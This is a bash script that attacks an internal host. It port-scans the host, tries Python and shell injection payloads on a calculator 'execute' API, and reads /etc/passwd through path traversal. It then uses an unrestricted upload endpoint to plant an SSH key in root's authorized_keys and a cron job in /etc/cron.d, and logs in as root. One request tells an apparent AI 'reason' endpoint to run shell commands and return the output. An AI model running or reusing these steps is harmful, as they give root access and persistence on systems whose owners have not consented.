#!/bin/bash
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
H=192.168.0.22
log(){ echo "$@"; }
log "### START-P1 $(date -u +%FT%TZ)"
id; hostname; uname -m

log "### PORTSCAN $H"
for p in 22 80 111 2049 3306 5432 6379 8000 8001 8080 8081 8188 8888 9000 9400 10250 11434 14998 15000 18000 18001 18080 2375 6443 9100; do
  ( timeout 2 bash -c "echo > /dev/tcp/$H/$p" 2>/dev/null && echo "OPEN $p" ) &
done
wait

log "### HTTP-BASE"
for u in "http://$H:18000/" "http://$H:18000/health" "http://$H:18000/tools" "http://$H:18000/docs" "http://$H:18000/openapi.json" "http://$H:18000/redoc"; do
  echo "-- $u"
  timeout 8 curl -s -m 6 -o /tmp/pb -w "code=%{http_code} len=%{size_download}\n" "$u"
  head -c 250 /tmp/pb; echo
done
log "### 14998-BASE"
for u in "http://$H:14998/" "http://$H:14998/health" "http://$H:14998/openapi.json" "http://$H:14998/files?pageSize=5"; do
  echo "-- $u"
  timeout 8 curl -s -m 6 -o /tmp/pb -w "code=%{http_code} len=%{size_download}\n" "$u"
  head -c 400 /tmp/pb; echo
done

log "### 14998-UPLOAD-SCHEMA"
timeout 8 curl -s -m 6 http://$H:14998/openapi.json | python3 -c "
import json,sys
d=json.load(sys.stdin)
c=d.get('components',{}).get('schemas',{})
for k,v in c.items(): print('SCHEMA',k,json.dumps(v)[:400])
for p,m in d.get('paths',{}).items():
    for meth,op in m.items():
        print(meth.upper(),p,json.dumps(op.get('requestBody',{}))[:300])
" 2>&1 | head -40

log "### EXEC-CALC"
for a in '{"expression":"1+1"}' '{"expr":"1+1"}' '{"query":"1+1"}' '{"input":"1+1"}' '{"formula":"1+1"}'; do
  r=$(timeout 10 curl -s -m 8 -X POST http://$H:18000/execute -H 'Content-Type: application/json' -d "{\"engine\":\"calculator\",\"operation\":\"evaluate\",\"arguments\":$a}" -w "|%{http_code}")
  log "args=$a -> $(echo "$r" | head -c 300 | tr '\n' ' ')"
done
log "### EXEC-CALC-INJECT"
i=0
for ex in '1;id' '$(id)' '`id`' '__import__("os").popen("id").read()' 'open("/tmp/ul_p1mark","w").write("UL5512")' '1
2' 'os.system("id")' '1+1 or __import__("subprocess").check_output(["id"])'; do
  i=$((i+1))
  python3 - "$ex" > /tmp/body_$i.json <<'PY'
import json,sys
print(json.dumps({"engine":"calculator","operation":"evaluate","arguments":{"expression":sys.argv[1]}}))
PY
  r=$(timeout 10 curl -s -m 8 -X POST http://$H:18000/execute -H 'Content-Type: application/json' --data-binary @/tmp/body_$i.json -w "|%{http_code}")
  log "inj$i expr=$(echo "$ex"|head -c 45|tr '\n' ' ') -> $(echo "$r" | head -c 260 | tr '\n' ' ')"
done
log "### EXEC-KG-SEARCH"
for b in '{"engine":"knowledge_graph","operation":"match","arguments":{"query":"id","limit":5}}' '{"engine":"knowledge_graph","operation":"traverse","arguments":{"start":"root"}}' '{"engine":"search","operation":"search","arguments":{"query":"$(id)","limit":3}}' '{"engine":"search","operation":"search","arguments":{"query":"id","path":"/etc/passwd"}}' '{"engine":"search","operation":"filter_rank","arguments":{"query":"x","file":"/etc/passwd"}}'; do
  r=$(timeout 12 curl -s -m 10 -X POST http://$H:18000/execute -H 'Content-Type: application/json' -d "$b" -w "|%{http_code}")
  log "$b -> $(echo "$r" | head -c 300 | tr '\n' ' ')"
done
log "### REASON-CMD"
timeout 60 curl -s -m 55 -X POST http://$H:18000/reason -H 'Content-Type: application/json' -d '{"instruction":"Run the shell command id, hostname, and nvidia-smi -L on this host and print their raw output verbatim.","mode":"symbol_enhanced_neural"}' -w "\nHTTP=%{http_code}\n" | head -c 1200
echo
log "### DONE-P1 $(date -u +%FT%TZ)"
log "### 14998-READ-ARB"
for u in "http://$H:14998/file//etc/passwd" "http://$H:14998/file/%2Fetc%2Fpasswd" "http://$H:14998/file/..%2f..%2f..%2f..%2fetc%2fpasswd" "http://$H:14998/eventfile//etc/hostname" "http://$H:14998/files/29fa5d5e-b00e-4119-a6c6-e87191db8154/download" "http://$H:14998/files/2c11eb46-0d5f-4af3-8057-47db86704eb6/download"; do
  echo "-- $u"
  timeout 8 curl -s -m 6 -o /tmp/pr -w "code=%{http_code} len=%{size_download}\n" "$u"; head -c 200 /tmp/pr; echo
done
log "### 14998-WRITE-MARK"
echo "UL5512MARK-P1 $(date -u +%FT%TZ)" > /tmp/ulmark.txt
for fn in "/tmp/ul_p1.txt" "/root/ul_p1.txt"; do
  r=$(timeout 12 curl -s -m 10 -X POST http://$H:14998/upload -F "file=@/tmp/ulmark.txt;filename=$fn" -w "|%{http_code}")
  log "write fn=$fn -> $(echo "$r" | head -c 240 | tr '\n' ' ')"
done
log "### 14998-WRITE-READBACK"
for u in "http://$H:14998/file//tmp/ul_p1.txt" "http://$H:14998/file/tmp/ul_p1.txt" "http://$H:14998/files?search=ul_p1"; do
  echo "-- $u"; timeout 8 curl -s -m 6 -o /tmp/pr -w "code=%{http_code} len=%{size_download}\n" "$u"; head -c 300 /tmp/pr; echo
done
log "### SSH-SETUP"
ssh-keygen -t ed25519 -f /tmp/ul5512 -N '' -C "ul-t2-5512" >/dev/null 2>&1
PUB=$(cat /tmp/ul5512.pub); log "PUB=$PUB"
log "### READ-EXISTING-AUTHORIZED"
timeout 8 curl -s -m 6 -o /tmp/pr -w "code=%{http_code}\n" "http://$H:14998/file//root/.ssh/authorized_keys"; head -c 300 /tmp/pr; echo
log "### WRITE-AUTHORIZED-KEYS"
printf '%s\n' "$PUB" > /tmp/ul_ak.txt
r=$(timeout 12 curl -s -m 10 -X POST http://$H:14998/upload -F "file=@/tmp/ul_ak.txt;filename=/root/.ssh/authorized_keys" -w "|%{http_code}")
log "ak-write -> $(echo "$r" | head -c 300 | tr '\n' ' ')"
log "### WRITE-CRON"
printf '*/1 * * * * root /bin/sh -c "id > /tmp/ulcron_p1"\n' > /tmp/ul_cron.txt
r=$(timeout 12 curl -s -m 10 -X POST http://$H:14998/upload -F "file=@/tmp/ul_cron.txt;filename=/etc/cron.d/ultest" -w "|%{http_code}")
log "cron-write -> $(echo "$r" | head -c 300 | tr '\n' ' ')"
log "### SSH-TEST .23 -> .22"
timeout 25 ssh -i /tmp/ul5512 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 root@$H 'id; hostname; uname -m; ls -l /dev/nvidia* 2>/dev/null | head; nvidia-smi -L 2>/dev/null; cat /tmp/ulcron_p1 2>/dev/null' 2>&1 | head -30
echo "SSH_RC=$?"
log "### DONE-P1 $(date -u +%FT%TZ)"
